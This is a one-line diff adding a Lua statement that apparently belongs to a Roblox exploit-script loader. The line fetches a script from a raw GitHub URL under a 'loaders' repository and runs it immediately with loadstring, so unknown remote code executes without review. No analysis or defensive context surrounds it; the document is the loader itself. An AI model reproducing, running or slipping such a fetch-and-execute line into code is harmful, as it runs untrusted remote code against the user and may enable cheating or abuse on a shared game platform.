@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/anomaly-lockdown-tweaked-spam3-kisrtwdlghl5pi.lua"))()
